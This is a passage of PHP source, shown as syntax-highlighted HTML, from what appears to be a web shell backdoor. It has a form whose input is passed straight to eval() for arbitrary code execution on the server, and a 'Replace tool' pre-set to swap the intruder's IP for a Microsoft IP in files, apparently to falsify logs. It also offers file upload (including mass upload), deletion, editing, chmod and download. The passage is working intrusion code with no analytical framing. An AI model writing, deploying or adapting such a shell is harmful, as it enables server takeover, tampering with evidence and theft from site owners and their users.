<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">]){</span> <span class="k">echo</span> <span class="s2">&quot;md5:&amp;lt;br&amp;gt;&amp;lt;textarea rows=1 cols=113&amp;gt;&quot;</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$md5</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;&amp;lt;b&amp;gt;base64 e/d:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input name=base64 size=30&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">]){</span>
<span class="o">@</span><span class="nv">$base64</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">];</span>
<span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;b&amp;gt;Encode: &amp;lt;br&amp;gt;&amp;lt;textarea rows=15 cols=113&amp;gt;&quot;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$base64</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">Decode:&amp;lt;/b&amp;gt; &amp;lt;br&amp;gt;&amp;lt;textarea rows=15 cols=113&amp;gt;&quot;</span><span class="o">.</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$base64</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;&amp;lt;b&amp;gt;DES:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input name=des size=30&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">John The Ripper [&amp;lt;a href=http://www.openwall.com/john/ target=_blank&amp;gt;Web&amp;lt;/a&amp;gt;]&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;des&#39;</span><span class="p">]){</span>
<span class="o">@</span><span class="nv">$des</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;des&#39;</span><span class="p">];</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Des:&amp;lt;/b&amp;gt; &amp;lt;br&amp;gt;&amp;lt;textarea rows=15 cols=113&amp;gt;&quot;</span><span class="o">.</span><span class="nb">crypt</span><span class="p">(</span><span class="nv">$des</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;}</span>

<span class="k">print</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;b&amp;gt;eval:&amp;lt;/b&amp;lt;br&amp;gt;</span>
<span class="s2">(example: print </span><span class="se">\&quot;</span><span class="s2">Hello World</span><span class="se">\&quot;</span><span class="s2">;)</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">&amp;lt;font color=red&amp;gt;&amp;lt;b&amp;gt;&lt;?&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;textarea name=eval rows=15 cols=113&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;b&amp;gt;?&gt;&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=Run style=&#39;width:150px;&#39;&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>

<span class="k">function</span> <span class="nf">eval_sl</span><span class="p">(</span><span class="nv">$editf</span><span class="p">){</span>
<span class="k">if</span><span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">()</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
<span class="nv">$editf</span><span class="o">=</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$editf</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">return</span> <span class="nv">$editf</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">]){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;RESULT:&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">eval</span><span class="p">(</span><span class="nx">eval_sl</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">]));</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>

<span class="k">print</span> <span class="s2">&quot;&amp;lt;font color=green&amp;gt;&amp;lt;b&amp;gt;PHP:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&lt;?</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nx">eval_sl</span><span class="p">((</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">])));</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;?&gt;</span><span class="se">\r\n\r\n</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>

<span class="p">}</span>

<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;}</span>

<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;replace&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;1&quot;</span><span class="p">){</span>
<span class="nv">$ip</span><span class="o">=@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
<span class="nv">$d</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">];</span>
<span class="nv">$e</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">];</span>
<span class="o">@</span><span class="nv">$de</span><span class="o">=</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">;</span>
<span class="nv">$de</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$de</span><span class="p">);</span>
<span class="nv">$e</span><span class="o">=@</span><span class="nv">$e</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;del_f=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;Delete&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ef=</span><span class="si">$e</span><span class="s2">&amp;edit=1&#39;&amp;gt;Edit&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;clean=1&#39;&amp;gt;Filesize to 0 byte&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&amp;replace=1&#39;&amp;gt;Replace text in file&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;download=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;Download&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;rename=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;Rename&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;chmod=1&amp;wich_f=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;CHMOD&amp;lt;/a&amp;gt;] [&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ccopy_to=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;Copy&amp;lt;/a&amp;gt;]&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">Replace tool:&amp;lt;br&amp;gt;</span>
<span class="s2">(You can replace any text)&amp;lt;br&amp;gt;</span>
<span class="s2">File: </span><span class="si">$de</span><span class="s2">&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">1. Your ip.&amp;lt;br&amp;gt;</span>
<span class="s2">2. microsoft.com ip :)&amp;lt;br&amp;gt;</span>
<span class="s2">Replace this &amp;lt;input name=thisX size=30 value=</span><span class="si">$ip</span><span class="s2">&amp;gt; by this &amp;lt;input name=bythis size=30 value=207.46.245.156&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit name=doit value=Replace&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;doit&#39;</span><span class="p">]){</span>
<span class="o">@</span><span class="nv">$thisX</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;thisX&#39;</span><span class="p">];</span>
<span class="o">@</span><span class="nv">$bythis</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;bythis&#39;</span><span class="p">];</span>
<span class="o">@</span><span class="nv">$e</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">];</span>
<span class="nv">$filename</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$e</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nv">$fd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span> <span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span>
<span class="nv">$rpl</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fread</span> <span class="p">(</span><span class="nv">$fd</span><span class="p">,</span> <span class="o">@</span><span class="nb">filesize</span> <span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
<span class="nv">$re</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$thisX</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$bythis</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$rpl</span><span class="p">);</span>
<span class="nv">$x</span><span class="o">=@</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$e</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$re</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;center&amp;gt;</span><span class="si">$thisX</span><span class="s2"> Replaced by </span><span class="si">$bythis</span><span class="s2">&amp;lt;br&amp;gt;</span>
<span class="s2">[&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$e</span><span class="s2">&#39;&amp;gt;VIew file&amp;lt;/a&amp;gt;]&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;Br&amp;gt;&quot;</span><span class="p">;</span>

<span class="p">}</span>
<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;}</span>


<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;upload&quot;</span><span class="p">){</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;t=massupload&#39;&amp;gt;* Mass upload *&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">File upload:&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;form enctype=</span><span class="se">\&quot;</span><span class="s2">multipart/form-data</span><span class="se">\&quot;</span><span class="s2"> method=post&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text size=50&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input name=where size=52 value=&#39;</span><span class="si">$d</span><span class="s2">&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">New file name:&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input name=newf size=30 autocomplete=off&amp;gt; (if empty, it will be default)&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=Upload name=uploadf&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uploadf&#39;</span><span class="p">]){</span>
<span class="nv">$where</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">];</span>
<span class="nv">$newf</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;newf&#39;</span><span class="p">];</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$newf</span><span class="o">==</span><span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$newf</span><span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];}</span><span class="k">else</span><span class="p">{</span><span class="nv">$newf</span><span class="o">=</span><span class="nv">$newf</span><span class="p">;}</span>
<span class="nv">$uploadfile</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.</span><span class="nv">$newf</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$uploadfile</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$uploadfile</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;&amp;lt;br&amp;gt;Uploaded to </span><span class="si">$uploadfile</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;&amp;lt;br&amp;gt;Error&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="p">}</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;massupload&quot;</span><span class="p">){</span>
<span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">Mass upload:&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;form enctype=</span><span class="se">\&quot;</span><span class="s2">multipart/form-data</span><span class="se">\&quot;</span><span class="s2"> method=post&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text1 size=43&amp;gt; &amp;lt;input type=file name=text11 size=43&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text2 size=43&amp;gt; &amp;lt;input type=file name=text12 size=43&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text3 size=43&amp;gt; &amp;lt;input type=file name=text13 size=43&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text4 size=43&amp;gt; &amp;lt;input type=file name=text14 size=43&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text5 size=43&amp;gt; &amp;lt;input type=file name=text15 size=43&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text6 size=43&amp;gt; &amp;lt;input type=file name=text16 size=43&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text7 size=43&amp;gt; &amp;lt;input type=file name=text17 size=43&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text8 size=43&amp;gt; &amp;lt;input type=file name=text18 size=43&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text9 size=43&amp;gt; &amp;lt;input type=file name=text19 size=43&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=file name=text10 size=43&amp;gt; &amp;lt;input type=file name=text20 size=43&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input name=where size=43 value=&#39;</span><span class="si">$d</span><span class="s2">&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=Upload name=massupload&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;massupload&#39;</span><span class="p">]){</span>
<span class="nv">$where</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile1</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text1&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile2</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text2&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile3</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text3&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile4</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text4&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile5</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text5&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile6</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text6&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile7</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text7&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile8</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text8&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile9</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text9&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile10</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text10&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile11</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text11&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile12</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text12&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile13</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text13&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile14</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text14&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile15</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text15&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile16</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text16&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile17</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text17&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile18</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text18&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile19</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text19&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="nv">$uploadfile20</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$where</span><span class="s2">/&quot;</span><span class="o">.@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text20&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text1&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile1</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile1</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text2&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile2</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile2</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text3&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile3</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;i&amp;gt;Uploaded to </span><span class="si">$uploadfile3</span><span class="s2">&amp;lt;/i&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;text4&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile4</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$where</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$where</span><span class="p">);</span>
